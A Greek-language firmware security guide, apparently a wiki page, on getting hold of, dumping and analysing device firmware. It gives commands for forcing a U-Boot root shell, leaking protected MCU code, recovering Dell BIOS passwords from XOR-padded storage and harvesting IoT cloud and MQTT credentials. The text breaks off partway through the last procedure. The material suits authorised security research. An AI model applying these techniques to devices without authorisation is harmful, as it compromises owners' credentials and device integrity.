## **Συλλογή πληροφοριών**

Η **συλλογή πληροφοριών** είναι ένα κρίσιμο αρχικό βήμα για την κατανόηση της σύνθεσης μιας συσκευής και των τεχνολογιών που χρησιμοποιεί. Αυτή η διαδικασία περιλαμβάνει τη συλλογή δεδομένων σχετικά με:

- Την αρχιτεκτονική της CPU και το λειτουργικό σύστημα που εκτελεί
- Τα χαρακτηριστικά του bootloader
- Τη διάταξη του υλικού και τα datasheets
- Μετρικές της βάσης κώδικα και τοποθεσίες του πηγαίου κώδικα
- Εξωτερικές βιβλιοθήκες και τύπους αδειών χρήσης
- Ιστορικό ενημερώσεων και κανονιστικές πιστοποιήσεις
- Διαγράμματα αρχιτεκτονικής και ροής
- Αξιολογήσεις ασφαλείας και εντοπισμένες ευπάθειες

Για τον σκοπό αυτό, τα εργαλεία **open-source intelligence (OSINT)** είναι πολύτιμα, όπως και η ανάλυση τυχόν διαθέσιμων στοιχείων λογισμικού ανοιχτού κώδικα μέσω μη αυτόματων και αυτοματοποιημένων διαδικασιών ελέγχου. Εργαλεία όπως το [Coverity Scan](https://scan.coverity.com) και το [LGTM της Semmle](https://lgtm.com/#explore) προσφέρουν δωρεάν στατική ανάλυση, η οποία μπορεί να αξιοποιηθεί για τον εντοπισμό πιθανών προβλημάτων.

## **Απόκτηση του Firmware**

Η απόκτηση firmware μπορεί να γίνει με διάφορους τρόπους, καθένας με διαφορετικό βαθμό πολυπλοκότητας:

- **Απευθείας** από την πηγή (προγραμματιστές, κατασκευαστές)
- **Δημιουργώντας το** βάσει των παρεχόμενων οδηγιών
- **Κατεβάζοντάς το** από επίσημους ιστότοπους υποστήριξης
- Χρησιμοποιώντας ερωτήματα **Google dork** για τον εντοπισμό φιλοξενούμενων αρχείων firmware
- Αποκτώντας **απευθείας πρόσβαση σε αποθηκευτικό χώρο cloud**, με εργαλεία όπως το [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Υποκλέπτοντας **ενημερώσεις** μέσω τεχνικών man-in-the-middle
- **Εξάγοντάς το** από τη συσκευή μέσω συνδέσεων όπως **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) ή **PICit**
- **Υποκλέπτοντας** αιτήματα ενημέρωσης κατά την επικοινωνία της συσκευής
- Εντοπίζοντας και χρησιμοποιώντας **hardcoded endpoints ενημερώσεων**
- **Κάνοντας dump** από τον bootloader ή το δίκτυο
- **Αφαιρώντας και διαβάζοντας** το chip αποθήκευσης, όταν αποτύχουν όλες οι άλλες μέθοδοι, με τα κατάλληλα εργαλεία υλικού

### Καταγραφές μόνο μέσω UART: εξαναγκασμός εκκίνησης root shell μέσω env του U-Boot στη flash

Αν το RX του UART αγνοείται (καταγράφονται μόνο logs), μπορείτε και πάλι να εξαναγκάσετε την εκκίνηση ενός shell init **επεξεργαζόμενοι offline το blob περιβάλλοντος του U-Boot**:<sup>[[6]](#references)</sup>

1. Κάντε dump της SPI flash με clip SOIC-8 και programmer (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Εντοπίστε το partition env του U-Boot, επεξεργαστείτε το `bootargs` ώστε να περιλαμβάνει το `init=/bin/sh` και **υπολογίστε ξανά το U-Boot env CRC32** για το blob.
3. Κάντε reflash μόνο το partition env και επανεκκινήστε· θα πρέπει να εμφανιστεί ένα shell στο UART.

Αυτό είναι χρήσιμο σε embedded συσκευές όπου το shell του bootloader είναι απενεργοποιημένο, αλλά το partition env είναι εγγράψιμο μέσω εξωτερικής πρόσβασης στη Flash.

### Αποκάλυψη προστατευμένου κώδικα μέσω εργασίας αντιγραφής του Firewall

Ορισμένα MCU επιτρέπουν σε μη προστατευμένο κώδικα εφαρμογής να καλεί μια πύλη της προστατευμένης περιοχής αντί να διαβάζει απευθείας την προστατευμένη Flash. Αφού αποκτήσετε εκτέλεση κώδικα εφαρμογής, εξετάστε κάθε εργασία πύλης ως ξεχωριστό primitive μεταφοράς μνήμης. Στην περίπτωση του Cypherock X1, η πύλη κλήσεων Firewall του STM32L4 δεχόταν μια εργασία, έναν εξωτερικό δείκτη `data`, ένα μήκος και μια προστατευμένη `address`. Μια εργασία εγγραφής δεν απέρριπτε έναν δείκτη πηγαίων δεδομένων που έδειχνε σε κώδικα του Firewall. Ο καλών δεν μπορούσε να διαβάσει απευθείας αυτόν τον κώδικα, αλλά η ίδια η πύλη μπορούσε να τον αντιγράψει σε προστατευμένο μη πτητικό αποθηκευτικό χώρο, από τον οποίο μια επιτρεπόμενη εργασία ανάγνωσης τον αποκάλυπτε.<sup>[[15]](#references)</sup>

Για να αναπαραγάγετε αυτήν την κατηγορία αποκάλυψης, εντοπίστε μια εγγράψιμη σελίδα προστατευμένου αποθηκευτικού χώρου με αντίστοιχη εργασία ανάγνωσης, ορίστε την πηγή εγγραφής σε διαδοχικές διευθύνσεις προστατευμένου κώδικα και διαβάστε τα προσωρινά αποθηκευμένα byte. Ελέγξτε το μέσο αποθήκευσης πριν επαναλάβετε τις εγγραφές: στην προκειμένη περίπτωση ήταν Flash, επομένως μια σελίδα έπρεπε να διαγραφεί πριν χρησιμοποιηθεί ξανά. Οι ερευνητές χρησιμοποίησαν μια ρουτίνα που διέγραφε και επανέφερε τα έγκυρα περιεχόμενα του Secure Data Storage και, στη συνέχεια, αποθήκευαν προσωρινά τον κώδικα στον υπόλοιπο ελεύθερο χώρο, αντί να αντικαταστήσουν δεδομένα πορτοφολιού. Αυτό απαιτεί εκτέλεση κώδικα στο MCU και προσβάσιμη πύλη κλήσεων· δεν αποτελεί άμεσο bypass ανάγνωσης από μη πιστοποιημένο host.<sup>[[15]](#references)</sup>

Ο ανακτημένος κώδικας μπορεί να αποκαλύψει [κενά εμπιστοσύνης στην ενημέρωση firmware και στην ακεραιότητα της εκκίνησης](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata).<sup>[[15]](#references)</sup>

## Ανάλυση του firmware

Τώρα που **έχετε το firmware**, πρέπει να εξαγάγετε πληροφορίες γι' αυτό, ώστε να γνωρίζετε πώς να το χειριστείτε. Διαφορετικά εργαλεία που μπορείτε να χρησιμοποιήσετε γι' αυτό:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Αν δεν βρείτε πολλά με αυτά τα εργαλεία, ελέγξτε την **εντροπία** της εικόνας με `binwalk -E <bin>`. Αν η εντροπία είναι χαμηλή, τότε μάλλον δεν είναι κρυπτογραφημένη. Αν είναι υψηλή, πιθανότατα είναι κρυπτογραφημένη (ή συμπιεσμένη με κάποιον τρόπο).

### Ακατέργαστα assets οθόνης σε εξωτερική flash

Ένα εξωτερικό SPI dump δεν είναι απαραίτητα το εκτελέσιμο firmware του MCU. Για έναν στόχο Cortex-M, συγκρίνετε την αρχή κάθε υποψήφιας περιοχής κώδικα με το memory map της συσκευής: ένας τυπικός vector table ξεκινά με μια εύλογη διεύθυνση δείκτη στοίβας SRAM και μια διεύθυνση reset handler σε εκτελέσιμη μνήμη. Η απουσία vector table στο offset μηδέν από μόνη της δεν αποδεικνύει ότι ολόκληρο το chip δεν περιέχει κώδικα· επιθεωρήστε και άλλα offsets, καθώς και τη διάταξη εκκίνησης. Αν το `binwalk` δεν εντοπίσει container, επιθεωρήστε τα ακατέργαστα bytes και συσχετίστε τις διευθύνσεις ανάγνωσης flash από ένα [αποκωδικοποιημένο SPI capture](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) με τις ενέργειες που φορτώνουν νέες οθόνες.<sup>[[14]](#references)</sup>

Για μια περιοχή με assets οθόνης, δοκιμάστε υποψήφια pixel formats και διαστάσεις αντί να υποθέσετε ότι πρόκειται για PNG/JPEG. Η συσκευή που αναφέρεται χρησιμοποιούσε frames **80×160 RGB565 little-endian**: με δύο bytes ανά pixel, ένα frame είναι **25.600 bytes** (25 KiB), όχι 24 kilobits. Μια διεύθυνση ανάγνωσης flash που αποκωδικοποιήθηκε προσδιόρισε το offset του asset οθόνης· ο ερευνητής μετέτρεψε μια προετοιμασμένη εικόνα με `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, αντικατέστησε το asset ίδιου μεγέθους στο αρχικό dump, το έγραψε με `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` και επιβεβαίωσε ότι η νέα εικόνα εμφανίστηκε στην οθόνη. Αυτό αποδεικνύει ότι είναι δυνατή η εγγραφή *εξωτερικών assets οθόνης*, όχι η εξαγωγή ή η επανεγγραφή του εσωτερικού firmware του MCU. Κρατήστε το αρχικό dump και επαληθεύστε τις διαστάσεις, τη σειρά των bytes, το offset και το μήκος του asset αντικατάστασης πριν από οποιαδήποτε εγγραφή.<sup>[[14]](#references)</sup>

### Διαφορική ανάλυση flash και ανακτήσιμες αποθήκες μυστικών με XOR

Όταν μια ρύθμιση firmware δεν έχει τεκμηριωμένη μορφή αποθήκευσης, αρχικά πραγματοποιήστε αρκετές αντίστοιχες αναγνώσεις flash, αλλάξτε **ακριβώς μία** ρύθμιση, κάντε ξανά dump ολόκληρου του chip και συγκρίνετε τα offsets. Επαναλάβετε το πείραμα με ελεγχόμενες τιμές για να ξεχωρίσετε τη ρύθμιση από τους μετρητές και τα metadata εγγραφής· οι αλλαγές σε νέα offsets αντί για επιτόπου υποδεικνύουν αποθήκη append-only ή log-structured. Διατηρήστε τις διαγραμμένες/tombstoned εγγραφές, επειδή τα payload bytes τους μπορεί να παραμένουν ανακτήσιμα.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Μετά τον εντοπισμό της περιοχής, εξαγάγετε τα modules του firmware με εργαλεία όπως το `binwalk` και κάντε reverse engineering του writer/validator στο Ghidra. Επιβεβαιώστε στον κώδικα τα όρια των πεδίων, το padding, την αρίθμηση θέσεων του κλειδιού και την παραγωγή του κλειδιού, αντί να συμπεράνετε το σχήμα μόνο από μοτίβα του ciphertext.<sup>[[12]](#references)</sup>

#### Ανάκτηση κλειδιών από κρυπτογραφημένο padding μηδενικών

Όπως περιγράφεται στην [κρυπτογράφηση βασισμένη σε XOR](../../crypto/symmetric/#xor-based-encryption), το γνωστό plaintext αποκαλύπτει bytes της keystream στις ίδιες θέσεις. Ένα πεδίο σταθερού μεγέθους είναι ιδιαίτερα εκτεθειμένο όταν το padding μηδενικών καλύπτει κάθε θέση ενός επαναλαμβανόμενου κλειδιού XOR: το κρυπτογραφημένο padding αποκαλύπτει απευθείας αυτά τα bytes του κλειδιού, επειδή `0x00 XOR key_byte = key_byte`. Αν καλύπτονται όλες οι θέσεις του κλειδιού, ανασυνθέστε το κλειδί από την ουρά του ciphertext και αποκρυπτογραφήστε τα bytes που περιέχουν δεδομένα.<sup>[[12]](#references)</sup>

Η ευάλωτη μορφή κωδικού πρόσβασης BIOS DVAR της Dell είναι ένα συγκεκριμένο παράδειγμα: το byte `0` ενός πεδίου 32 bytes είναι σε plaintext, ενώ τα bytes `1..31` χρησιμοποιούν ένα επαναλαμβανόμενο κλειδί 20 bytes.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Για μήκος κωδικού πρόσβασης `L`, οι θέσεις `L..31` ήταν μηδενικές πριν από το XOR. Όταν `L <= 12`, αυτές οι θέσεις καλύπτουν κάθε δείκτη κλειδιού, οπότε ανακτώνται ολόκληρο το κλειδί και ο κωδικός πρόσβασης χωρίς brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Ανάκτηση κλειδιών από ιστορικά αρχεία

Μην αναλύετε κάθε εγγραφή ανεξάρτητα. Το κλειδί DVAR παράγεται κατά προσέγγιση ως `modified_md5(device_seed || variable_GUID || password[0])`: το seed της συσκευής και το GUID είναι σταθερά, ενώ η μόνη είσοδος που εξαρτάται από τον κωδικό πρόσβασης είναι το πρώτο byte σε καθαρή μορφή. Αυτό δίνει έως 256 κλειδιά ανά συσκευή και σημαίνει ότι οι εγγραφές που αρχίζουν με το ίδιο byte μοιράζονται ένα κλειδί. Ομαδοποιήστε τις ενεργές και τις διαγραμμένες εγγραφές με βάση αυτό το byte· μια σύντομη ιστορική εγγραφή μπορεί να αποκαλύψει ολόκληρο το κλειδί μέσω του padding και να αποκρυπτογραφήσει μια τρέχουσα, μεγαλύτερη εγγραφή της οποίας το padding δεν επαρκεί. Επομένως, η αλλαγή κωδικού πρόσβασης μπορεί να αυξήσει την έκθεση, όταν το παλιό κρυπτοκείμενο επισημαίνεται ως διαγραμμένο αντί να διαγράφεται.<sup>[[12]](#references)</sup>

Το εργαλείο [`dellpwn`](https://github.com/R3n5k1/dellpwn) εντοπίζει DVAR, επικυρώνει υποψήφιες εγγραφές, ανακτά κωδικούς πρόσβασης και μπορεί να εμφανίσει τα ακατέργαστα αποθηκευμένα bytes και τα bytes του κλειδιού. Κάντε build από ένα checkout και σαρώστε ένα επαληθευμένο flash image ως εξής:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Για custom parsers, απορρίψτε τα false positives με βάση τη δομή των εγγραφών, τους περιορισμούς εκτυπώσιμων χαρακτήρων, τους ελέγχους μηδενικής συμπλήρωσης, την εντροπία του κλειδιού και τη συνέπεια στα σημεία όπου επαναλαμβάνεται το κλειδί. Αν επαναλαμβανόμενα dumps εμφανίζουν σποραδικές αλλαγές bit ανά εγγραφή, καταγράψτε τις παρατηρημένες μάσκες και κατατάξτε τις διορθώσεις με βάση αυτούς τους περιορισμούς, αλλά αναφέρετε τους αμφίσημους χαρακτήρες αντί να παρουσιάζετε ευρεστικά αποτελέσματα ως ακριβή ανάκτηση.<sup>[[12]](#references)</sup>

Οι password verifiers πρέπει να αποθηκεύουν ένα salted, iterated one-way hash αντί για αντιστρέψιμο ciphertext, ενώ τα log-structured stores πρέπει να αφαιρούν με ασφάλεια το παρωχημένο μυστικό υλικό.<sup>[[12]](#references)</sup>

### Λήψη του συστήματος αρχείων

Με τα εργαλεία που σχολιάστηκαν προηγουμένως, όπως το `binwalk -ev <bin>`, θα έπρεπε να έχετε καταφέρει να **εξαγάγετε το σύστημα αρχείων**.\
Το Binwalk συνήθως το εξάγει μέσα σε έναν **φάκελο με όνομα τον τύπο του συστήματος αρχείων**, ο οποίος συνήθως είναι ένας από τους εξής: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Χειροκίνητη εξαγωγή συστήματος αρχείων

Μερικές φορές, το binwalk **δεν θα έχει τα magic bytes του συστήματος αρχείων στις υπογραφές του**. Σε αυτές τις περιπτώσεις, χρησιμοποιήστε το binwalk για να **βρείτε το offset του συστήματος αρχείων και να απομονώσετε το συμπιεσμένο σύστημα αρχείων** από το binary και να **εξαγάγετε χειροκίνητα** το σύστημα αρχείων ανάλογα με τον τύπο του, ακολουθώντας τα παρακάτω βήματα.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Εκτελέστε την ακόλουθη **dd command** για να κάνετε carving του συστήματος αρχείων Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Εναλλακτικά, μπορεί να εκτελεστεί και η ακόλουθη εντολή.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Για squashfs (που χρησιμοποιείται στο παραπάνω παράδειγμα)

`$ unsquashfs dir.squashfs`

Τα αρχεία θα βρίσκονται στη συνέχεια στον κατάλογο "`squashfs-root`".

- Αρχεία αρχειοθήκης CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Για συστήματα αρχείων jffs2

`$ jefferson rootfsfile.jffs2`

- Για συστήματα αρχείων ubifs με NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Ανακατασκευή διαχωρισμένων ενσωματωμένων συστημάτων αρχείων root

Αν ένα raw dump eMMC/SSD περιέχει έγκυρη επικεφαλίδα συστήματος αρχείων, αλλά τα offsets των μεταδεδομένων του εκτείνονται πέρα από το ονομαστικό partition, μην το χαρακτηρίσετε αμέσως ως κατεστραμμένο. Ο ενσωματωμένος κώδικας εκκίνησης μπορεί να συναρμολογεί την πραγματική συσκευή root από πολλαπλά φυσικά τμήματα μέσω του Device Mapper, οπότε το carving ενός GPT partition παράγει μόνο το πρώτο τμήμα.<sup>[[9]](#references)</sup>

#### Διαλογή του πλήρους ειδώλου μέσου αποθήκευσης

Πρώτα, επαληθεύστε ότι η απόκτηση έχει ολοκληρωθεί, το μέγεθος είναι σταθερό και κανένας writer δεν έχει πλέον ανοιχτό το είδωλο. Αν το όνομα του αρχείου κωδικοποιεί διεύθυνση έναρξης/λήξης, συγκρίνετε αυτό το εύρος με τον πραγματικό αριθμό byte. Ανακτήστε το GPT σε λειτουργία μόνο για ανάγνωση και προσαρτήστε μόνο το απαιτούμενο εύρος· **μην** εκτελέσετε `vgchange -ay` σε μη έμπιστο φυσικό τόμο στον σταθμό εργασίας, καθώς είναι πιθανά τα conflicts μεταξύ ομάδων τόμων και οι ακούσιες εγγραφές.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Προτιμήστε μια προσωρινή VM όταν η αρχική λογική init ή μια στοίβα LVM πρέπει να έχει πρόσβαση σε ολόκληρο το image. Τα ιστορικά boot logs από ένα τυπικό boot partition είναι ιδιαίτερα χρήσιμα: ο bootloader μπορεί να έχει καταγράψει offsets proprietary containers, μήκη components, επιλογή slot, κανόνες ευθυγράμμισης και επαλήθευση υπογραφών. Χρησιμοποιήστε αυτές τις τιμές για να απομονώσετε ένα ενσωματωμένο command line/kernel/initramfs και, στη συνέχεια, επικυρώστε κάθε έξοδο ανεξάρτητα με `file`, magic bytes και `binwalk`· η ανάγνωση μέχρι το τέλος του container μπορεί κατά λάθος να προσθέσει ένα initrd, ένα αντικείμενο ACPI ή μια υπογραφή στο kernel.<sup>[[9]](#references)</sup>

#### Ανάκτηση του χάρτη block κατά την εκκίνηση

Εξαγάγετε το initramfs του kernel και κάντε reverse engineering στο `/init` και σε τυχόν βιβλιοθήκες αποθήκευσης. Στο [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), ακολουθήστε τις αναφορές συμβολοσειρών για `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` και paths διαμερισμάτων· στη συνέχεια, ανιχνεύστε τον κώδικα που επιλέγει το ενεργό A/B slot και δημιουργεί τον πίνακα. Χρήσιμα σημεία εκκίνησης στο radare2 είναι τα `r2 -A init`, `afl`, `pdf @ main` και `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Ο στόχος linear αντιστοιχίζει διαδοχικές περιοχές μιας εικονικής συσκευής σε περιοχές μίας ή περισσότερων υποκείμενων συσκευών. Ένας πίνακας δύο τμημάτων που έχει ανακτηθεί έχει συνήθως αυτή τη μορφή (όλες οι θέσεις και τα μήκη είναι τομείς των 512 byte):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Αναπαραγάγετε ακριβώς την αριθμητική των machine-code, συμπεριλαμβανομένων του πλάτους των ακεραίων, των μετατοπίσεων και των μετατροπών μονάδων. Για παράδειγμα, η ακόλουθη έκφραση στρογγυλοποιεί προς τα κάτω ένα μέγεθος σε bytes στο πλησιέστερο όριο των 4 KiB και μόνο έπειτα το μετατρέπει σε τομείς των 512 bytes· αν την αντικαταστήσετε με `p4_bytes // 512`, το επιλεγμένο τέλος μετατοπίζεται κατά `p4_bytes % 4096` κάθε φορά που το partition δεν είναι ευθυγραμμισμένο σε όριο σελίδας.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Ανακατασκευάστε μια επίπεδη εικόνα ανάλυσης αντιγράφοντας τα εύρη με τη σειρά του πίνακα, σε τμήματα περιορισμένου μεγέθους, αντί να φορτώσετε ολόκληρο το media dump στη μνήμη. Έτσι αποφεύγετε επίσης τη δημιουργία host-side mapper devices. Διατηρήστε τα offsets που προκύπτουν από το GPT, τους ανεστραμμένους αριθμούς τομέων και το τελικό μήκος εξόδου ως ξεχωριστές assertions.<sup>[[9]](#references)</sup>

#### Διακρίνετε την αλλοίωση από ένα σταθερό σφάλμα ανακατασκευής

Για το SquashFS, ελέγξτε το magic `hsqs` και αποκωδικοποιήστε το πεδίο `bytes_used` των 64 bit σε little-endian μορφή, στο offset 40 του superblock, πριν εκτελέσετε το `unsquashfs`. Αν η εξαγωγή αποτυγχάνει σε αρκετές άσχετες δομές, αναζητήστε σε ένα ευρύ παράθυρο γύρω από τις αναμενόμενες θέσεις και απαιτήστε ισχυρές δομικές ενδείξεις: ένα block μεταδεδομένων που μπορεί να αποσυμπιεστεί, αρκετές διαδοχικές έγκυρες εγγραφές καταλόγου, εύλογα πεδία inode, ένα root inode συνεπές με τον αριθμό των inode ή έγκυρη δομή μεταδεδομένων ακεραιότητας. Μία μόνο αντιστοιχία magic δεν αρκεί.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Όταν η ίδια προσημασμένη διαφορά καθιστά έγκυρες ανεξάρτητες δομές—για παράδειγμα, τα μεταδεδομένα καταλόγου και μια εγγραφή verity—η πιθανότερη αιτία είναι ένα συστηματικό σφάλμα στην αρχή του segment και όχι bytes που λείπουν. Επιστρέψτε στην ανεστραμμένη αριθμητική και αναζητήστε απορριφθέντα υπόλοιπα, signedness, overflow ή στρογγυλοποίηση σε τομέα/σελίδα, πριν επιχειρήσετε ανάκτηση ορφανών δεδομένων ή επιδιόρθωση μεταδεδομένων του συστήματος αρχείων.<sup>[[9]](#references)</sup>

Τέλος, διατηρήστε ξεχωριστά τα όρια προστασίας: οι τόμοι LUKS με κλειδιά δεσμευμένα στο TPM προστατεύουν την εμπιστευτικότητα των δεδομένων, ενώ μια υπογεγραμμένη αντιστοίχιση dm-verity προστατεύει την ακεραιότητα του root filesystem. Ένα software TPM δεν ανακτά ένα κλειδί που είναι δεσμευμένο στο αρχικό φυσικό TPM, ενώ η εκκίνηση ενός τροποποιημένου SquashFS μέσω ενός init μόνο για ερευνητική χρήση, που παραλείπει την επαλήθευση verity, δεν πλαστογραφεί την υπογραφή του ούτε παρακάμπτει το dm-verity.<sup>[[9]](#references)</sup>

## Ανάλυση Firmware

Μόλις αποκτηθεί το firmware, είναι απαραίτητο να αναλυθεί διεξοδικά ώστε να κατανοηθεί η δομή του και οι πιθανές ευπάθειές του. Αυτή η διαδικασία περιλαμβάνει τη χρήση διαφόρων εργαλείων για την ανάλυση και την εξαγωγή χρήσιμων δεδομένων από την εικόνα firmware.

### Εργαλεία αρχικής ανάλυσης

Παρακάτω παρέχεται ένα σύνολο εντολών για την αρχική επιθεώρηση του δυαδικού αρχείου (που αναφέρεται ως `<bin>`). Αυτές οι εντολές βοηθούν στον εντοπισμό τύπων αρχείων, στην εξαγωγή strings, στην ανάλυση δυαδικών δεδομένων και στην κατανόηση των λεπτομερειών των partitions και των συστημάτων αρχείων:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Για να αξιολογηθεί η κατάσταση κρυπτογράφησης της εικόνας, ελέγχεται η **εντροπία** με `binwalk -E <bin>`. Η χαμηλή εντροπία υποδηλώνει απουσία κρυπτογράφησης, ενώ η υψηλή εντροπία υποδηλώνει πιθανή κρυπτογράφηση ή συμπίεση.

Για την εξαγωγή **ενσωματωμένων αρχείων**, συνιστώνται εργαλεία και πόροι όπως η τεκμηρίωση **file-data-carving-recovery-tools** και το **binvis.io** για την επιθεώρηση αρχείων.

### Εξαγωγή του Συστήματος Αρχείων

Με τη χρήση του `binwalk -ev <bin>`, συνήθως μπορεί κανείς να εξαγάγει το σύστημα αρχείων, συχνά σε έναν κατάλογο με όνομα που αντιστοιχεί στον τύπο του συστήματος αρχείων (π.χ. squashfs, ubifs). Ωστόσο, όταν το **binwalk** δεν αναγνωρίζει τον τύπο του συστήματος αρχείων επειδή λείπουν τα magic bytes, απαιτείται χειροκίνητη εξαγωγή. Αυτό περιλαμβάνει τη χρήση του `binwalk` για τον εντοπισμό της θέσης μετατόπισης του συστήματος αρχείων και, στη συνέχεια, της εντολής `dd` για την αποκοπή του συστήματος αρχείων:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Στη συνέχεια, ανάλογα με τον τύπο του συστήματος αρχείων (π.χ. squashfs, cpio, jffs2, ubifs), χρησιμοποιούνται διαφορετικές εντολές για τη μη αυτόματη εξαγωγή των περιεχομένων.

### Ανάλυση συστήματος αρχείων

Μετά την εξαγωγή του συστήματος αρχείων, ξεκινά η αναζήτηση για ελαττώματα ασφαλείας. Εξετάζονται μη ασφαλείς network daemons, hardcoded διαπιστευτήρια, API endpoints, λειτουργίες διακομιστών ενημερώσεων, μη μεταγλωττισμένος κώδικας, scripts εκκίνησης και compiled binaries για offline ανάλυση.

**Βασικές τοποθεσίες** και **στοιχεία** προς έλεγχο περιλαμβάνουν:

- Τα **etc/shadow** και **etc/passwd** για διαπιστευτήρια χρηστών
- Πιστοποιητικά και κλειδιά SSL στο **etc/ssl**
- Αρχεία ρυθμίσεων και scripts για πιθανά τρωτά σημεία
- Ενσωματωμένα binaries για περαιτέρω ανάλυση
- Συνήθεις web servers και binaries συσκευών IoT

Διάφορα εργαλεία βοηθούν στον εντοπισμό ευαίσθητων πληροφοριών και τρωτών σημείων μέσα στο σύστημα αρχείων:

- Τα [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) και [**Firmwalker**](https://github.com/craigz28/firmwalker) για αναζήτηση ευαίσθητων πληροφοριών
- Το [**εργαλείο ανάλυσης και σύγκρισης firmware (FACT)**](https://github.com/fkie-cad/FACT_core) για ολοκληρωμένη ανάλυση firmware
- Τα [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) και [**EMBA**](https://github.com/e-m-b-a/emba) για στατική και δυναμική ανάλυση

### Έλεγχοι ασφαλείας σε compiled binaries

Τόσο ο πηγαίος κώδικας όσο και τα compiled binaries που βρίσκονται στο σύστημα αρχείων πρέπει να ελέγχονται για τρωτά σημεία. Εργαλεία όπως το **checksec.sh** για binaries Unix και το **PESecurity** για binaries Windows βοηθούν στον εντοπισμό απροστάτευτων binaries που θα μπορούσαν να αποτελέσουν αντικείμενο εκμετάλλευσης.

## Συλλογή διαπιστευτηρίων cloud config και MQTT μέσω tokens που παράγονται από URL

Πολλά IoT hubs ανακτούν τις ρυθμίσεις ανά συσκευή από ένα cloud endpoint με μορφή:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Κατά την ανάλυση firmware, μπορεί να διαπιστώσετε ότι το `<token>` παράγεται τοπικά από το αναγνωριστικό της συσκευής, χρησιμοποιώντας ένα hardcoded μυστικό, για παράδειγμα:

- token = MD5( deviceId || STATIC_KEY ) και αναπαρίσταται ως κεφαλαίο hex

Αυτός ο σχεδιασμός επιτρέπει σε οποιονδήποτε γνωρίζει ένα deviceId και το STATIC_KEY να ανακατασκευάσει το URL και να ανακτήσει τις cloud config, αποκαλύπτοντας συχνά διαπιστευτήρια MQTT σε απλό κείμενο και προθέματα topic.

Πρακτική διαδικασία:

1) Εξαγάγετε το deviceId από τα UART boot logs

- Συνδέστε έναν προσαρμογέα UART 3,3 V (TX/RX/GND) και καταγράψτε τα logs:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Αναζητήστε γραμμές που εκτυπώνουν το μοτίβο URL του cloud config και τη διεύθυνση του broker, για παράδειγμα:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Ανάκτηση του STATIC_KEY και του αλγορίθμου token από το firmware

